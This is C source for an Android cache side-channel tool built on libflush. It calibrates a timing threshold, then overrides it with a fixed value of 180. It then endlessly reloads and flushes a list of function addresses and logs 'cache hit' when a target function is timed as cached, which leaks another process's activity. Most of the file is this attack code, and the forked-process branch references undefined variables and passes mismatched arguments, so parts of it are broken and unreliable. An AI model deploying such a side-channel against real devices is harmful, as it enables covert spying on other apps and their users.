/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"
#include "libflush.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif

#include <android/log.h>


static int shared_data_shm_fd = 0;
#endif

#include "logoutput.h"
#include "calibrate.h"
#define BIND_TO_CPU 0

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

/* Forward declarations */
static void attack_master(size_t range, bool spy, useconds_t
offset_update_time );
static void attack_slave(libflush_session_t* libflush_session, 
                         size_t threshold, size_t number_of_tests, 
                         FILE* logfile, size_t* addr, size_t length, size_t target);


/* Shared data */
typedef struct shared_data_s {
    unsigned int current_offset;
    lock_t lock;
} shared_data_t;

static shared_data_t* shared_data = NULL;

#ifdef WITH_THREADS
static shared_data_t shared_data_tmp;
void* attack_thread(void* ptr);
#endif

size_t *addr;
size_t length;
size_t flag=0;

int hit(int cpu, size_t number_of_forks, size_t* addr_, size_t length_, size_t target)
//addr: func list
//length: the length of func list
//number_of_forks: 1
//the address of target function
{
    LOGD("Start.\n");
    size_t threshold = 0; 
    length = length_;
    addr = malloc(sizeof(size_t)*length);
    memcpy(addr,addr_,sizeof(size_t)*length);
    //for(int i=0;i<length;i++)
    //  LOGD("address:%p",addr[i]);
    useconds_t offset_update_time = OFFSET_UPDATE_TIME;
    size_t number_of_tests = NUMBER_OF_TESTS;
    FILE* logfile = NULL;
    /* Setup shared memory */
#ifdef WITH_THREADS
    shared_data = &shared_data_tmp;
#else
#ifdef WITH_ANDROID
  shared_data_shm_fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
  if (shared_data_shm_fd < 0) {
    LOGE("Error: Could not create shared memory.\n");
    return -1;
  }
  ioctl(shared_data_shm_fd, ASHMEM_SET_NAME, "shared_data");
  ioctl(shared_data_shm_fd, ASHMEM_SET_SIZE, sizeof(shared_data));

  shared_data = mmap(NULL, sizeof(shared_data), PROT_READ | PROT_WRITE,
      MAP_SHARED, shared_data_shm_fd, 0);
  if (shared_data == MAP_FAILED) {
    fprintf(stderr, "Error: Could not map shared memory.\n");
    return -1;
  }
#else
    /* Create shared memory for current offset */
    shared_data_shm_fd = shmget(IPC_PRIVATE, sizeof(shared_data_t), IPC_CREAT | SHM_R | SHM_W);//ipc_private create a new one;
    if (shared_data_shm_fd == -1) {
        LOGE("Error: Could not get shared memory segment.\n");
        //LOGE(Error: Could not get shared memory segment.\n");
        return -1;
    }

    shared_data = shmat(shared_data_shm_fd, NULL, 0);
    if (shared_data == (void*) -1) {
        LOGE("Error: Could not attach shared memory.\n");
        //fprintf(stderr, "Error: Could not attach shared memory.\n");
        return -1;
    }
#endif
#endif

    if (shared_data == NULL) {
        LOGE("Error: Implementation error: shared_data is not set.\n");
        //fprintf(stderr, "Error: Implementation error: shared_data is not set.\n");
        return -1;
    }

    tal_unlock(&(shared_data->lock));

    /* Initialize libflush */
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    LOGD("Initialize successfully.\n");

    /* Map file */
    /* Start calibration */
    if (threshold == 0) {
        //fprintf(stdout, "[x] Start calibration... "); 
	threshold = calibrate(libflush_session,addr[0]); //calibrate to get the threshold 
	threshold = 180; //sometimes you need to determined by yourself
        LOGD("[x] calibration... %zu\n", threshold);
    }

    /* Start cache template attack */
    /*
    fprintf(stdout, "[x] Filename: %s\n", filename);
    fprintf(stdout, "[x] Offset: %zu\n", offset);
    fprintf(stdout, "[x] Range: %zu\n", range);
    fprintf(stdout, "[x] Threshold: %zu\n", threshold);
    fprintf(stdout, "[x] Spy-mode: %s\n", (spy == true) ? "yes" : "no");
    */
    LOGD("[x] Target: %zx\n", addr[length-1]);
    LOGD("[x] Threshold: %zu\n", threshold);
    LOGD("[x] Number of forks: %zu\n",number_of_forks);

    /* Bind to CPU */
    size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    LOGD("[x] number of cpu: %zu\n", number_of_cpus);

    /* Start master and slaves */

#ifndef WITH_THREADS
    //process mode, not used
    pid_t pids[number_of_forks+1];
    LOGD("Parent PID %d",getpid());
    fflush(stdout);
    for (unsigned int i = 0; i < number_of_forks+1; i++) {
        int pid = fork();
        pids[i] = pid;
	LOGD("PIDS[%d]=%d",i,pids[i]);//27689 and 27690
        if (pids[i] == -1) {
            LOGE("Error: Failed to fork %d process\n", (unsigned int) i);//No
            //fprintf(stderr, "Error: Failed to fork %d process\n", (unsigned int) i);
            exit(-2);
        } else if (pids[i] == 0) {
	    LOGD("PID[%d]==0",i);
            libflush_bind_to_cpu((cpu + i) % number_of_cpus);
            if (i == 0) {
                //fprintf(stdout, "[x] Master process %d with pid %d\n", (unsigned int) i, getpid());
                LOGD("[x] Master process %d with pid %d\n", (unsigned int) i, getpid());
                //fflush(stdout);
                attack_master(range, spy, offset_update_time);
            } else {
#if LOCK_ROUND_ROBIN == 1
               lock_attr_t attr;
               attr.number_of_forks = number_of_forks;
               attr.fork_idx = i - 1;
               tal_init(&(shared_data->lock), &attr);
#else
                LOGD("TAIL_INIT");
                tal_init(&(shared_data->lock), NULL);
#endif
                LOGE("[x] Slave process %d with pid %d\n", (unsigned int) i, getpid());
                //fprintf(stdout, "[x] Slave process %d with pid %d\n", (unsigned int) i, getpid());
                //fflush(stdout);
                attack_slave(libflush_session, m, threshold, offset, number_of_tests,
                             logfile);
            }
            exit(0);
        }
    }

    /* Wait for slaves to finish */
    int status = 0;
    pid_t wait_pid = 0;
    LOGD("Parent");
    while (true) {
        wait_pid = waitpid(pids[0], &status, WNOHANG|WUNTRACED);
        wait_pid = waitpid(pids[0], &status, WNOHANG|WUNTRACED);
        if (wait_pid == -1) {
            break;
        } else if (wait_pid == 0) {
            sleep(5);
        } else if (wait_pid == pids[0]) {
            LOGD("[x] Exit status of %d was %d\n", wait_pid, status);
            for (unsigned int i = 1; i < number_of_forks+1; i++) {
                if (kill(pids[i], SIGKILL) == -1) {
                    LOGE("Error: Could not kill process %d\n", pids[i]);
                }
            }
            break;
        }
    }
#else
  /*
  pthread_t* threads = calloc(number_of_forks, sizeof(pthread_t));
  if (threads == NULL) {
    return -1;
  }

  thread_data_t* thread_data = calloc(number_of_forks, sizeof(thread_data_t));
  if (thread_data == NULL) {
    return -1;
  }
  for (unsigned int i = 0; i < number_of_forks+1; i++) {
    thread_data[i].type = (i == 0) ? THREAD_FLUSH_AND_RELOAD : THREAD_FLUSH;
    thread_data[i].threshold = threshold;
    thread_data[i].cpu_id = (cpu + i) % number_of_cpus;
    thread_data[i].offset_update_time = offset_update_time;
    thread_data[i].number_of_tests = number_of_tests;
    thread_data[i].logfile = logfile;
    thread_data[i].libflush_session = libflush_session;
    thread_data[i].ofs = addr;
    thread_data[i].length = length;
    fprintf(stdout, "[x] Create thread %u\n", i);
    
    LOGD("[x] Create thread %u\n", i);
    if (pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]) != 0) 	  
    	return -1;
  }
  pthread_join(threads[0], NULL);
  free(threads);
  free(thread_data);
  */

  attack_slave(libflush_session, // use only one thread instead
        threshold, number_of_tests, 
        logfile,addr,length,target);
#endif

#ifndef WITH_THREADS
#ifdef WITH_ANDROID
    if (shared_data != NULL) {
    munmap(shared_data, sizeof(unsigned int));
  }

  if (shared_data_shm_fd != -1) {
    close(shared_data_shm_fd);
  }
#else
    if (shared_data != NULL) {
        shmdt(shared_data);
    }
    if (shared_data_shm_fd != -1) {
        shmctl(shared_data_shm_fd, IPC_RMID, 0);
    }
#endif
#endif

    /* Clean-up */
    if (logfile != NULL) {
        fclose(logfile);
    }

    //munmap(m, range);
    //close(fd);

    /* Terminate libflush */
    libflush_terminate(libflush_session);

    return 0;
}

#ifdef WITH_THREADS
void*
attack_thread(void* ptr)
{
  thread_data_t* thread_data = (thread_data_t*) ptr;
  libflush_bind_to_cpu(thread_data->cpu_id);
  if (thread_data->type == THREAD_FLUSH_AND_RELOAD) {
    attack_master(thread_data->range, thread_data->spy,
        thread_data->offset_update_time);
  } else if (thread_data->type == THREAD_FLUSH && flag ==0) {
    attack_slave(thread_data->libflush_session, thread_data->threshold, 
        thread_data->number_of_tests, 
        thread_data->logfile,thread_data->ofs,thread_data->length,1);
  }
  pthread_exit(NULL);
}
#endif

//not used
static void
attack_master(size_t range, bool spy, useconds_t offset_update_time)
{
  do {
      for (shared_data->current_offset = 0; shared_data->current_offset < range; shared_data->current_offset += 64) {
          LOGD("[x] attack master %p",shared_data->current_offset);
          usleep(offset_update_time);//Update the whole range.
      }
  } while (spy == true);
}

static void
attack_slave(libflush_session_t* libflush_session, size_t threshold,
             size_t number_of_tests, FILE* logfile,size_t* addr, size_t length, size_t target)
{
    libflush_init(&libflush_session, NULL);//initialize twice
    LOGD("[x] attack slave ");
    /* Run Flush and reload */
    for(int crt_ofs=0; true; crt_ofs=(crt_ofs+1)%length){//Traverse all addresses
      int pause = 0;
      uint64_t count = libflush_reload_address_and_flush(libflush_session, addr[crt_ofs]);  //load the address into cache to count the time, and then flush out
      //if access time < threshold, and addr==target function
      if (count < threshold&&addr[crt_ofs]==target)
      {
        LOGD("cache hit %p", (void*) (addr[crt_ofs]));
      }
    }
}
